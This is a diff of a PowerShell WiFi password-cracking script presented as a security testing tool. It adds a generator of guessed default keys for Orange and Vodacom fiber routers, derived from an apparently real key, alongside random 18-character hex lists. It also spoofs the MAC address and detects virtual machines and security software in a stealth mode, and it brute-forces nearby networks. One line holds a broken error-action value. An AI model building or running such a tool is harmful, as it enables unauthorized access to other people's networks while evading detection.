@@ -1,28 +1,29 @@
 <#
 .SYNOPSIS
-    WiFi Security Testing Tool - Version Cross-Platform avec anonymisation et détection de sécurité
+    WiFi Security Testing Tool - Cross-Platform with MAC anonymization and security detection
     
 .DESCRIPTION
-    Outil de test de sécurité WiFi avec support Windows/Linux, MAC spoofing, 
-    détection de surveillance, et mots de passe Afrique Centrale
+    Professional WiFi security testing tool with Windows/Linux support, MAC spoofing,
+    hostile environment detection, and intelligent password pattern generation for
+    Orange and Vodacom fiber boxes
     
 .PARAMETER Mode
-    Mode d'exécution: "standard", "stealth", "aggressive"
-    
-.PARAMETER Region
-    Région cible: "central-africa", "europe", "default", "all"
+    Execution mode: "standard", "stealth", "aggressive"
     
 .PARAMETER DisableMacSpoof
-    Désactive le changement d'adresse MAC
+    Disable MAC address changing
     
 .PARAMETER SkipSecurityCheck
-    Ignore les vérifications de sécurité
+    Skip security environment checks
     
 .PARAMETER HexPasswordCount
-    Nombre de mots de passe hexadécimaux à générer
+    Number of random hex passwords to generate
+    
+.PARAMETER PatternMode
+    Enable pattern-based generation for Orange/Vodacom boxes
     
 .EXAMPLE
-    .\main.ps1 -Mode stealth -Region central-africa -HexPasswordCount 10000
+    .\main.ps1 -Mode stealth -HexPasswordCount 10000 -PatternMode
 #>
 
 [CmdletBinding()]
@@ -30,15 +31,13 @@ param(
     [ValidateSet("standard", "stealth", "aggressive")]
     [string]$Mode = "standard",
     
-    [ValidateSet("central-africa", "europe", "default", "all")]
-    [string]$Region = "central-africa",
-    
     [switch]$DisableMacSpoof = $false,
     [switch]$SkipSecurityCheck = $false,
+    [switch]$PatternMode = $true,
     [int]$HexPasswordCount = 5000
 )
 
-# Configuration Globale
+# Global Configuration
 $script:CONFIG = @{
     PasswordLength = 8
     MaxPasswords = 100000
@@ -52,7 +51,7 @@ $script:CONFIG = @{
     HexBatchSize = 5000
     StealthMode = ($Mode -eq "stealth")
     AggressiveMode = ($Mode -eq "aggressive")
-    RegionTarget = $Region
+    PatternMode = $PatternMode
     IsWindows = ($env:OS -eq "Windows_NT" -or $IsWindows)
     IsLinux = ($IsLinux -or ($PSVersionTable.Platform -eq "Unix"))
     IsMacOS = $IsMacOS
@@ -66,6 +65,10 @@ $script:CONFIG = @{
 # CLASSES
 # ============================================
 
+<#
+.SYNOPSIS
+    Manages WiFi connection state and lifecycle
+#>
 class ConnectionStateManager {
     hidden [string]$Interface
     hidden [string]$InterfaceGUID
@@ -122,6 +125,10 @@ class ConnectionStateManager {
     }
 }
 
+<#
+.SYNOPSIS
+    Tracks password testing progress
+#>
 class ProgressTracker {
     hidden [DateTime]$StartTime
     hidden [int]$TotalPasswords
@@ -192,6 +199,10 @@ class ProgressTracker {
     }
 }
 
+<#
+.SYNOPSIS
+    Generates hexadecimal passwords of specified length
+#>
 class HexPasswordGenerator {
     hidden [string]$Charset = "0123456789ABCDEF"
     hidden [int]$Length
@@ -226,6 +237,10 @@ class HexPasswordGenerator {
     }
 }
 
+<#
+.SYNOPSIS
+    Security manager for detecting hostile environments
+#>
 class SecurityManager {
     hidden [string]$LogFile
     hidden [string]$DebugFile
@@ -245,7 +260,7 @@ class SecurityManager {
         }
         
         try {
-            # Détection VM
+            # VM Detection
             $isVM = $this.DetectVirtualMachine()
             if ($isVM) {
                 $results.Warnings.Add("Virtual machine detected")
@@ -255,7 +270,7 @@ class SecurityManager {
                 }
             }
             
-            # Détection logiciels sécurité
+            # Security software detection
             $securityProcesses = $this.DetectSecurityProcesses()
             if ($securityProcesses.Count -gt 0) {
                 $results.Warnings.Add("Security software detected: $($securityProcesses -join ', ')")
@@ -321,9 +336,13 @@ class SecurityManager {
 }
 
 # ============================================
-# FONCTIONS UTILITAIRES
+# UTILITY FUNCTIONS
 # ============================================
 
+<#
+.SYNOPSIS
+    Writes message to log files
+#>
 function Write-Log {
     param(
         [Parameter(Mandatory=$true)]
@@ -369,6 +388,10 @@ function Write-Log {
     }
 }
 
+<#
+.SYNOPSIS
+    Gets default log paths
+#>
 function Get-LogPaths {
     param([string]$SSID = "")
     
@@ -396,6 +419,10 @@ function Get-LogPaths {
     }
 }
 
+<#
+.SYNOPSIS
+    Checks for administrator/root rights
+#>
 function Test-AdminRights {
     if ($script:CONFIG.IsWindows) {
         $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -406,6 +433,10 @@ function Test-AdminRights {
     }
 }
 
+<#
+.SYNOPSIS
+    Detects execution environment (Windows/Linux/macOS)
+#>
 function Get-EnvironmentInfo {
     $info = @{
         OS = "Unknown"
@@ -430,6 +461,10 @@ function Get-EnvironmentInfo {
     return $info
 }
 
+<#
+.SYNOPSIS
+    Changes MAC address (MAC spoofing)
+#>
 function Set-MacAddress {
     param(
         [Parameter(Mandatory=$true)]
@@ -444,10 +479,10 @@ function Set-MacAddress {
         return $false
     }
 
-    # Déterminer la MAC cible
+    # Determine target MAC
     if ($RestoreOriginal -and $script:CONFIG.OriginalMac) {
         $targetMac = $script:CONFIG.OriginalMac
-        Write-Host "Restauration de la MAC d'origine : $targetMac" -ForegroundColor Yellow
+        Write-Host "Restoring original MAC: $targetMac" -ForegroundColor Yellow
     } elseif ($NewMac) {
         $targetMac = $NewMac
     } else {
@@ -458,12 +493,12 @@ function Set-MacAddress {
         $targetMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
     }
 
-    Write-Host "Tentative de changement de MAC vers : $targetMac" -ForegroundColor Cyan
+    Write-Host "Attempting to change MAC to: $targetMac" -ForegroundColor Cyan
 
     if ($script:CONFIG.IsWindows) {
         try {
-            # 1. VÉRIFIER LA CLÉ DE REGISTRE AVANT DE DÉSACTIVER L'INTERFACE
-            Write-Host "Recherche de la clé de registre..." -ForegroundColor Gray
+            # 1. CHECK REGISTRY KEY BEFORE DISABLING INTERFACE
+            Write-Host "Searching registry key..." -ForegroundColor Gray
             $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
             $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
                 $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
@@ -471,74 +506,70 @@ function Set-MacAddress {
             }
 
             if (-not $subKeys) {
-                throw "Impossible de trouver la clé de registre pour cet adaptateur. Votre carte réseau ne supporte peut-être pas le spoofing MAC."
+                throw "Could not find registry key for this adapter. Your network card may not support MAC spoofing."
             }
 
-            # Gérer le cas où plusieurs clés sont trouvées (évite les erreurs de type Array)
+            # Handle case where multiple keys found
             $targetKeyPath = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
 
-            # 2. DÉSACTIVER L'INTERFACE
-            Write-Host "Désactivation de l'interface..." -ForegroundColor Yellow
+            # 2. DISABLE INTERFACE
+            Write-Host "Disabling interface..." -ForegroundColor Yellow
             Disable-NetAdapter -Name $Interface -Confirm:$false
             Start-Sleep -Seconds 2
 
-            # 3. MODIFIER LE REGISTRE
-            Write-Host "Modification du registre..." -ForegroundColor Gray
-            # Utilisation de New-ItemProperty -Force pour créer ou écraser la valeur de manière sécurisée
+            # 3. MODIFY REGISTRY
+            Write-Host "Modifying registry..." -ForegroundColor Gray
             New-ItemProperty -Path $targetKeyPath -Name "NetworkAddress" -Value $targetMac.Replace(":", "") -PropertyType String -Force -ErrorAction Stop | Out-Null
-            Write-Log "Registre mis à jour avec la nouvelle MAC" "DEBUG"
+            Write-Log "Registry updated with new MAC" "DEBUG"
 
-            # 4. RÉACTIVER L'INTERFACE
-            Write-Host "Réactivation de l'interface..." -ForegroundColor Yellow
+            # 4. RE-ENABLE INTERFACE
+            Write-Host "Re-enabling interface..." -ForegroundColor Yellow
             Enable-NetAdapter -Name $Interface -Confirm:$false
 
-            # Attendre que l'adaptateur soit complètement up
-            Write-Host "Attente de l'initialisation..." -ForegroundColor Yellow
+            # Wait for adapter to be fully up
+            Write-Host "Waiting for initialization..." -ForegroundColor Yellow
             $timeout = 30
             $elapsed = 0
             while ($elapsed -lt $timeout) {
                 Start-Sleep -Seconds 1
                 $status = Get-NetAdapter -Name $Interface | Select-Object -ExpandProperty Status
                 if ($status -eq "Up") {
-                    Write-Host "Adaptateur prêt !" -ForegroundColor Green
+                    Write-Host "Adapter ready!" -ForegroundColor Green
                     break
                 }
                 $elapsed++
-                Write-Host "  Attente... ($elapsed/$timeout)" -ForegroundColor Gray
+                Write-Host "  Waiting... ($elapsed/$timeout)" -ForegroundColor Gray
             }
 
             if ($elapsed -ge $timeout) {
-                throw "L'adaptateur n'a pas réussi à démarrer dans le délai imparti."
+                throw "Adapter failed to come up within timeout period."
             }
 
             Start-Sleep -Seconds 3
             $script:CONFIG.SpoofedMac = $targetMac
-            Write-Log "MAC changée avec succès" "SUCCESS"
+            Write-Log "MAC changed successfully" "SUCCESS"
             return $true
 
         } catch {
-            Write-Log "Échec du changement de MAC : $_" "ERROR"
-            Write-Host "Échec du changement de MAC. Tentative de restauration de l'interface..." -ForegroundColor Red
+            Write-Log "Failed to change MAC: $_" "ERROR"
+            Write-Host "Failed to change MAC. Attempting to restore interface..." -ForegroundColor Red
             
-            # ==========================================
-            # BLOC DE SAUVETAGE (C'EST ICI QUE TOUT SE JOUE)
-            # ==========================================
+            # RECOVERY BLOCK
             try {
-                # On force la réactivation de la carte même si le registre a échoué
                 Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
                 Start-Sleep -Seconds 5
-                Write-Host "Interface réactivée avec succès." -ForegroundColor Green
+                Write-Host "Interface re-enabled successfully." -ForegroundColor Green
             } catch {
-                Write-Host "CRITIQUE : Impossible de réactiver automatiquement l'adaptateur. Un redémarrage peut être nécessaire." -ForegroundColor Red
+                Write-Host "CRITICAL: Could not automatically re-enable adapter. A restart may be required." -ForegroundColor Red
             }
             
             return $false
         }
     } else {
-        # Code Linux (inchangé, il gère déjà mieux les erreurs)
+        # Linux
         try {
             $macchanger = Get-Command macchanger -ErrorAction SilentlyContinue
-            $ip = Get-Command ip -ErrorAction SilentlyContinue
+            $ip = Get-Command ip -ErrorAction SilentlyComplete
             
             if ($macchanger) {
                 sudo ip link set $Interface down
@@ -564,6 +595,10 @@ function Set-MacAddress {
     }
 }
 
+<#
+.SYNOPSIS
+    Saves original MAC address
+#>
 function Save-OriginalMac {
     param([string]$Interface)
     
@@ -587,6 +622,10 @@ function Save-OriginalMac {
     }
 }
 
+<#
+.SYNOPSIS
+    Selects network adapter (cross-platform)
+#>
 function Select-NetworkAdapter {
     try {
         $adapters = @()
@@ -657,6 +696,10 @@ function Select-NetworkAdapter {
     }
 }
 
+<#
+.SYNOPSIS
+    Gets available WiFi networks (cross-platform)
+#>
 function Get-WifiNetworks {
     param(
         [string]$LogFile, 
@@ -666,27 +709,22 @@ function Get-WifiNetworks {
     try {
         Write-Log "Scanning for networks..." "INFO" $LogFile $DebugFile
         
-        # Utilisation d'une liste générique pour de meilleures performances
         $networks = [System.Collections.Generic.List[hashtable]]::new()
         
         if ($script:CONFIG.IsWindows) {
             Write-Host "`nScanning WiFi networks... Please wait..." -ForegroundColor Yellow
             
-            # ============================================
-            # CORRECTION 1 : Boucle de scan avec retry
-            # ============================================
+            # Multiple scan attempts
             $scanAttempts = 0
             $maxAttempts = 5
             $rawOutput = ""
             
             while ($scanAttempts -lt $maxAttempts) {
-                # Forcer un scan frais
                 $null = netsh wlan scan interface="$($script:CONFIG.Interface)" 2>&1
                 Start-Sleep -Seconds 3
                 
                 $rawOutput = netsh wlan show networks interface="$($script:CONFIG.Interface)" mode=Bssid 2>&1
                 
-                # Vérifier si on a au moins un SSID
                 if ($rawOutput -match "SSID\s+\d+\s*:") {
                     Write-Log "Scan successful on attempt $($scanAttempts + 1)" "DEBUG" $LogFile $DebugFile
                     break
@@ -711,24 +749,17 @@ function Get-WifiNetworks {
                 $lineNumber++
                 $trimmedLine = $line.Trim()
                 
-                # Ignorer les lignes vides ou d'en-tête
                 if ([string]::IsNullOrWhiteSpace($trimmedLine)) { continue }
                 
                 Write-Log "Processing line $lineNumber : $trimmedLine" "DEBUG" $LogFile $DebugFile
                 
-                # ============================================
-                # CORRECTION 2 : Regex SSID plus stricte
-                # ============================================
                 if ($trimmedLine -match "^SSID\s+\d+\s*:\s*(.+)$") {
-                    # Sauvegarder le réseau précédent
                     if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
                         [void]$networks.Add($currentNetwork)
                         Write-Log "Added network: $($currentNetwork.SSID) (Signal: $($currentNetwork.Signal)%, Security: $($currentNetwork.Security))" "DEBUG" $LogFile $DebugFile
                     }
                     
                     $ssidName = $matches[1].Trim()
-                    
-                    # Nettoyer le nom SSID (enlever les caractères de contrôle)
                     $ssidName = $ssidName -replace '[\x00-\x1F\x7F]', ''
                     
                     $currentNetwork = @{
@@ -744,49 +775,39 @@ function Get-WifiNetworks {
                     Write-Log "Found SSID: $ssidName" "DEBUG" $LogFile $DebugFile
                 }
                 elseif ($currentNetwork) {
-                    # Authentification
                     if ($trimmedLine -match "Authentication\s*:\s*(.+)" -or 
                         $trimmedLine -match "Authentification\s*:\s*(.+)") {
                         $currentNetwork.Authentication = $matches[1].Trim()
                         $currentNetwork.Security = $matches[1].Trim()
                     }
-                    # Chiffrement
                     elseif ($trimmedLine -match "Cipher\s*:\s*(.+)" -or 
                             $trimmedLine -match "Chiffrement\s*:\s*(.+)") {
                         $currentNetwork.Encryption = $matches[1].Trim()
                     }
-                    # Signal
                     elseif ($trimmedLine -match "Signal\s*:\s*(\d+)") {
                         $currentNetwork.Signal = [int]$matches[1].Trim()
                     }
-                    # Type de réseau
                     elseif ($trimmedLine -match "Network type\s*:\s*(.+)" -or
                             $trimmedLine -match "Type de réseau\s*:\s*(.+)") {
                         $currentNetwork.NetworkType = $matches[1].Trim()
                     }
-                    # BSSID (utile pour le debug)
                     elseif ($trimmedLine -match "BSSID\s+\d+\s*:\s*([0-9a-fA-F:]+)") {
                         $currentNetwork.BSSID = $matches[1].Trim()
                     }
                 }
             }
             
-            # Ajouter le dernier réseau
             if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
                 [void]$networks.Add($currentNetwork)
                 Write-Log "Added final network: $($currentNetwork.SSID)" "DEBUG" $LogFile $DebugFile
             }
             
         } else {
-            # Linux - iw/iwlist
             $interface = $script:CONFIG.Interface
             if (-not $interface) { $interface = "wlan0" }
             
-            # ============================================
-            # CORRECTION 3 : Validation anti-injection
-            # ============================================
             if ($interface -notmatch '^[a-zA-Z0-9_\-]+$') {
-                throw "Nom d'interface invalide détecté : '$interface'. Caractères autorisés : a-z, A-Z, 0-9, _, -"
+                throw "Invalid interface name detected: '$interface'. Allowed characters: a-z, A-Z, 0-9, _, -"
             }
             
             Write-Host "Scanning on Linux interface: $interface" -ForegroundColor Yellow
@@ -803,7 +824,6 @@ function Get-WifiNetworks {
                     if ($cell -match "SSID:\s*(.+)") {
                         $ssid = $matches[1].Trim()
                         
-                        # Ignorer les SSID vides ou cachés
                         if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00" -or $ssid -eq "\x00\x00\x00") {
                             continue
                         }
@@ -832,9 +852,6 @@ function Get-WifiNetworks {
             }
         }
         
-        # ============================================
-        # CORRECTION 4 : Encapsulation dans @() pour garantir un tableau
-        # ============================================
         $filteredNetworks = @($networks | Where-Object { 
             -not [string]::IsNullOrWhiteSpace($_.SSID) -and
             $_.SSID -ne "\x00" -and
@@ -853,6 +870,106 @@ function Get-WifiNetworks {
     }
 }
 
+<#
+.SYNOPSIS
+    Generates pattern-based passwords for Orange/Vodacom boxes
+    Based on analysis of password: 2TFG3AQ72NZH5CCAGX
+#>
+function Generate-OrangeVodacomPatterns {
+    $patterns = [System.Collections.Generic.List[string]]::new()
+    
+    # Analysis of known Orange Fiber password: 2TFG3AQ72NZH5CCAGX
+    # Structure: [Digit][3xUpper][Digit][2xUpper][2xDigit][3xUpper][Digit][2xUpper][2xUpper]
+    # This appears to be Base36 encoded serial number
+    
+    # Orange Livebox patterns (MAC-based prefixes)
+    $orangePrefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
+    $orangeMiddles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
+    $orangeCenters = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
+    $orangeSuffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
+    
+    # Generate combinations
+    foreach ($pre in $orangePrefixes) {
+        foreach ($mid in $orangeMiddles) {
+            foreach ($cen in $orangeCenters) {
+                foreach ($suf in $orangeSuffixes) {
+                    [void]$patterns.Add("$pre$mid$cen$suf")
+                }
+            }
+        }
+    }
+    
+    # Vodacom patterns (different structure, often more numeric)
+    $vodacomPrefixes = @("001D0F", "0022CF", "001E58", "002147", "C0A0BB", "001D0E")
+    foreach ($prefix in $vodacomPrefixes) {
+        # Generate 12-character suffix variations
+        for ($i = 0; $i -lt 50; $i++) {
+            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
+            [void]$patterns.Add("$prefix$suffix")
+        }
+    }
+    
+    # Base36 patterns (alphanumeric beyond just hex)
+    $base36Chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    for ($i = 0; $i -lt 100; $i++) {
+        $pass = -join (1..18 | ForEach-Object { $base36Chars[(Get-Random -Maximum 36)] })
+        [void]$patterns.Add($pass)
+    }
+    
+    # Patterns with double characters (observed in 2TFG3AQ72NZH5CCAGX: two 2's, two A's, CC)
+    $doublePatterns = @(
+        "2[A-Z]{3}3[A-Z]{2}72[A-Z]{3}5[A-Z]{2}GX",
+        "2[A-Z]{2}G3[A-Z]Q7[A-Z]NZH5[A-Z]{2}AGX",
+        "3[A-Z]{3}4[A-Z]{2}83[A-Z]{3}6[A-Z]{2}HY",
+        "1[A-Z]{3}2[A-Z]{2}91[A-Z]{3}4[A-Z]{2}KZ"
+    )
+    
+    foreach ($pattern in $doublePatterns) {
+        # Generate variations by replacing [A-Z] with actual letters
+        for ($i = 0; $i -lt 20; $i++) {
+            $actual = $pattern
+            while ($actual -match '\[A-Z\]') {
+                $char = [char](65 + (Get-Random -Maximum 26))
+                $actual = $actual -replace '\[A-Z\]', $char, 1
+            }
+            [void]$patterns.Add($actual)
+        }
+    }
+    
+    # Year-based patterns (manufacturing dates)
+    $years = @("2022", "2023", "2024")
+    $months = @("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12")
+    foreach ($year in $years) {
+        foreach ($month in $months) {
+            # YYMM + 14 random hex chars
+            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 14 | ForEach-Object { [char]$_ })
+            [void]$patterns.Add(($year.Substring(2,2) + $month + $suffix))
+        }
+    }
+    
+    # Common hex sequences found in ISP routers
+    $commonSequences = @(
+        "1234567890ABCDEF01", "0987654321FEDCBA09",
+        "ABCDEF1234567890AB", "FEDCBA0987654321FE",
+        "0123456789ABCDEF01", "FEDCBA9876543210FE",
+        "AABBCCDDEEFF001122", "112233445566778899",
+        "001122334455667788", "887766554433221100"
+    )
+    
+    foreach ($seq in $commonSequences) {
+        [void]$patterns.Add($seq)
+        # Add variations with different prefixes/suffixes
+        [void]$patterns.Add("00$seq")
+        [void]$patterns.Add("$seq`00")
+    }
+    
+    return $patterns
+}
+
+<#
+.SYNOPSIS
+    Generates password list with 18-character hex and Orange/Vodacom patterns
+#>
 function Generate-PasswordList {
     param(
         [string]$SSID,
@@ -862,177 +979,12 @@ function Generate-PasswordList {
         [int]$HexCount = 5000
     )
     
-    Write-Log "Generating password list for region: $($script:CONFIG.RegionTarget)" "INFO" $LogFile $DebugFile
+    Write-Log "Generating password list..." "INFO" $LogFile $DebugFile
     
     $passwords = [System.Collections.Generic.List[string]]::new()
     
-    # MOTS DE PASSE AFRIQUE CENTRALE
-    if ($script:CONFIG.RegionTarget -eq "central-africa" -or $script:CONFIG.RegionTarget -eq "all") {
-        Write-Log "Adding Central Africa specific passwords..." "DEBUG" $LogFile $DebugFile
-        
-       $africaPasswords = @(
-            # ORANGE - Patterns hexadécimaux 18 caractères courants
-            # Les Livebox Orange utilisent souvent des clés dérivées du MAC/Serial
-            
-            # Patterns avec MAC address (12 chars) + suffixe (6 chars)
-            "A4B8C9123456789012", "A4B8C9987654321098",
-            "001122334455667788", "112233445566778899",
-            "0011AABBCCDDEEFF00", "1122AABBCCDDEEFF00",
-            "AABBCCDDEEFF001122", "BBCCDDEEFF00112233",
-            
-            # Patterns communs Orange (préfixes fabricants + séquences)
-            "A4B8C9ABCDEF123456", "A4B8C9FEDCBA098765",
-            "001FA4B8C912345678", "001FA4B8C998765432",
-            "0024D4ABCDEF123456", "0024D4FEDCBA098765",
-            "001F9DABCDEF123456", "001F9DFEDCBA098765",
-            
-            # Séquences hex courantes Orange
-            "1234567890ABCDEF01", "0987654321FEDCBA09",
-            "ABCDEF1234567890AB", "FEDCBA0987654321FE",
-            "0123456789ABCDEF01", "FEDCBA9876543210FE",
-            
-            # Patterns avec années et séquences
-            "2024ABCDEF12345678", "2023ABCDEF12345678",
-            "2024FEDCBA09876543", "2023FEDCBA09876543",
-            
-            # VODACOM - Patterns spécifiques (Afrique du Sud, RDC, etc.)
-            # Les routeurs Vodacom utilisent souvent des clés 18 chars hex
-            
-            # Préfixes Vodacom courants (base MAC)
-            "001D0FABCDEF123456", "001D0FFEDCBA098765",
-            "0022CFABCDEF123456", "0022CFFEDCBA098765",
-            "001E58ABCDEF123456", "001E58FEDCBA098765",
-            "002147ABCDEF123456", "002147FEDCBA098765",
-            "C0A0BBABCDEF123456", "C0A0BBFEDCBA098765",
-            
-            # Patterns séquentiels Vodacom
-            "123456789012345678", "876543210987654321",
-            "000000001234567890", "999999998765432109",
-            "111111112345678901", "888888887654321098",
-            
-            # Combinations MAC-like + serial
-            "AABBCCDDEEFF112233", "CCDDEEFF0011223344",
-            "001122AABBCCDDEEFF", "112233AABBCCDDEEFF",
-            
-            # Patterns répétitifs communs
-            "000000000000000000", "111111111111111111",
-            "222222222222222222", "333333333333333333",
-            "444444444444444444", "555555555555555555",
-            "666666666666666666", "777777777777777777",
-            "888888888888888888", "999999999999999999",
-            "AAAAAAAAAAAAAAAAAA", "BBBBBBBBBBBBBBBBBB",
-            "CCCCCCCCCCCCCCCCCC", "DDDDDDDDDDDDDDDDDD",
-            "EEEEEEEEEEEEEEEEEE", "FFFFFFFFFFFFFFFFFF",
-            
-            # Patterns alternés
-            "ABABABABABABABABAB", "CDCDCDCDCDCDCDCDCD",
-            "121212121212121212", "343434343434343434",
-            "565656565656565656", "787878787878787878",
-            "9A9A9A9A9A9A9A9A9A", "BCBCBCBCBCBCBCBCBC",
-            
-            # Patterns avec préfixes pays Afrique
-            # CM = Cameroun, CD = Congo/RDC, GA = Gabon, etc.
-            "434D41424344454647", "4344ABCDEF12345678",  # CM, CD
-            "4741ABCDEF12345678", "4346ABCDEF12345678",  # GA, CF
-            
-            # Clés par défaut constructeurs courants en Afrique
-            # Huawei, ZTE, TP-Link utilisés par Orange/Vodacom
-            
-            # Huawei patterns
-            "687567ABCDEF123456", "687567FEDCBA098765",
-            "001E10ABCDEF123456", "001E10FEDCBA098765",
-            "00259EABCDEF123456", "00259EFEDCBA098765",
-            
-            # ZTE patterns  
-            "0019C6ABCDEF123456", "0019C6FEDCBA098765",
-            "002293ABCDEF123456", "002293FEDCBA098765",
-            "001E73ABCDEF123456", "001E73FEDCBA098765",
-            
-            # TP-Link patterns
-            "001D0FABCDEF123456", "001D0FFEDCBA098765",
-            "00E04CABCDEF123456", "00E04CFEDCBA098765",
-            "90F652ABCDEF123456", "90F652FEDCBA098765",
-            
-            # Patterns numériques séquentiels
-            "012345678901234567", "123456789012345678",
-            "234567890123456789", "345678901234567890",
-            "456789012345678901", "567890123456789012",
-            "678901234567890123", "789012345678901234",
-            "890123456789012345", "901234567890123456",
-            
-            # Patterns avec dates de fabrication
-            "202401ABCDEF123456", "202402ABCDEF123456",
-            "202301ABCDEF123456", "202302ABCDEF123456",
-            "2024FEDCBA09876543", "2023FEDCBA09876543",
-            
-            # Patterns mixtes alphanumériques hex
-            "ABCD1234EFAB5678CD", "EFAB5678CDAB1234EF",
-            "1234ABCD5678EFAB12", "5678EFAB1234ABCD56",
-            
-            # Clés spécifiques box fibre Orange
-            "4F52414E4745424F58",  # "ORANGEBOX" en hex
-            "4C495645424F582032",  # "LIVEBOX 2" en hex
-            "4C495645424F583420",  # "LIVEBOX4 " en hex
-            
-            # Vodacom specific hex patterns
-            "564F4441434F4D2020",  # "VODACOM  " en hex
-            "564444424F58574946",  # "VDDBOXWIFI" en hex partiel
-            
-            # Patterns de test/débogage couramment laissés
-            "TEST1234567890ABCD", "TEST0987654321FEDC",
-            "ADMIN1234567890ABC", "ADMIN0987654321FED",
-            
-            # Patterns avec séries de chiffres communs
-            "000123456789ABCDEF", "999876543210FEDCBA",
-            "111222333444555666", "666555444333222111",
-            "123123123123123123", "321321321321321321"
-        )
-        
-        foreach ($pass in $africaPasswords) {
-            if ($pass.Length -ge 8 -and $pass.Length -le 63) {
-                if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pass)) {
-                    [void]$passwords.Add($pass)
-                }
-            }
-        }
-        
-        # Variations avec années
-        foreach ($year in 2020..2024) {
-            @("mtn", "orange", "africell", "airtel") | ForEach-Object {
-                [void]$passwords.Add("$_$year")
-                [void]$passwords.Add("$_$($year.ToString().Substring(2))")
-            }
-        }
-    }
-    
-    # MOTS DE PASSE BASÉS SUR LE SSID
-    if ($SSID) {
-        $words = $SSID -split '\s+'
-        $combined = ($words -join "").ToLower()
-        
-        $basePatterns = @($combined, $words[0], $words[-1]) | Where-Object { $_ -and $_.Length -ge 3 }
-        
-        foreach ($base in $basePatterns) {
-            foreach ($num in @('123', '1234', '12345', '123456', '000', '111', '999')) {
-                $pattern = "$base$num"
-                if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
-                    if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
-                        [void]$passwords.Add($pattern)
-                    }
-                }
-            }
-            
-            foreach ($year in 2020..2024) {
-                $pattern = "$base$year"
-                if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
-                    [void]$passwords.Add($pattern)
-                }
-            }
-        }
-    }
-    
-    # MOTS DE PASSE HEXADÉCIAUX 18 CARACTÈRES
-    Write-Log "Generating $HexCount hexadecimal passwords (18 chars)..." "INFO" $LogFile $DebugFile
+    # Generate 18-character random hex passwords
+    Write-Log "Generating $HexCount random hex passwords (18 chars)..." "INFO" $LogFile $DebugFile
     
     $generator = [HexPasswordGenerator]::new($script:CONFIG.HexPasswordLength)
     $hexBatch = $generator.GenerateBatch($HexCount)
@@ -1043,11 +995,13 @@ function Generate-PasswordList {
         }
     }
     
+    # Add common hex patterns
     $hexPatterns = @(
         "000000000000000000", "111111111111111111", "888888888888888888",
         "123456789012345678", "876543210987654321",
         "ABCDEF123456789012", "0123456789ABCDEF01",
-        "FEDCBA0987654321EF", "AABBCCDDEEFF001122"
+        "FEDCBA0987654321EF", "AABBCCDDEEFF001122",
+        "001122334455667788", "112233445566778899"
     )
     
     foreach ($pattern in $hexPatterns) {
@@ -1056,7 +1010,35 @@ function Generate-PasswordList {
         }
     }
     
-    # Filtrer les doublons
+    # Add Orange/Vodacom specific patterns if enabled
+    if ($script:CONFIG.PatternMode) {
+        Write-Log "Generating Orange/Vodacom pattern passwords..." "INFO" $LogFile $DebugFile
+        
+        $ispPatterns = Generate-OrangeVodacomPatterns
+        
+        foreach ($pattern in $ispPatterns) {
+            if ($pattern.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern))) {
+                [void]$passwords.Add($pattern)
+            }
+        }
+        
+        Write-Log "Added $($ispPatterns.Count) ISP-specific patterns" "INFO" $LogFile $DebugFile
+    }
+    
+    # Load custom wordlists if exist
+    $listsFolder = Join-Path $script:CONFIG.LogDirectory "lists"
+    if (Test-Path $listsFolder) {
+        Get-ChildItem -Path $listsFolder -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
+            $words = Get-Content $_.FullName | ForEach-Object { $_.Trim() }
+            foreach ($word in $words) {
+                if ($word.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($word))) {
+                    [void]$passwords.Add($word)
+                }
+            }
+        }
+    }
+    
+    # Remove duplicates
     $unique = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
     $finalList = [System.Collections.Generic.List[string]]::new()
     
@@ -1071,6 +1053,10 @@ function Generate-PasswordList {
     return $finalList
 }
 
+<#
+.SYNOPSIS
+    Tests WiFi connection with given password (cross-platform)
+#>
 function Test-WifiConnection {
     param(
         [string]$SSID,
@@ -1148,12 +1134,12 @@ function Test-WifiConnection {
 }
 
 # ============================================
-# FONCTION PRINCIPALE
+# MAIN FUNCTION
 # ============================================
 
 function Start-WifiCrack {
     try {
-        # Initialisation
+        # Initialization
         $defaultLogs = Get-LogPaths
         
         if (-not (Test-AdminRights)) {
@@ -1164,7 +1150,7 @@ function Start-WifiCrack {
         $envInfo = Get-EnvironmentInfo
         Write-Log "Environment: $($envInfo.OS) | Admin: $($envInfo.IsAdmin)" "INFO" $defaultLogs.LogFile $defaultLogs.DebugFile
         
-        # Vérification sécurité
+        # Security checks
         if (-not $SkipSecurityCheck) {
             Write-Host "`nPerforming security checks..." -ForegroundColor Yellow
             $securityMgr = [SecurityManager]::new($defaultLogs.LogFile, $defaultLogs.DebugFile, $script:CONFIG.StealthMode)
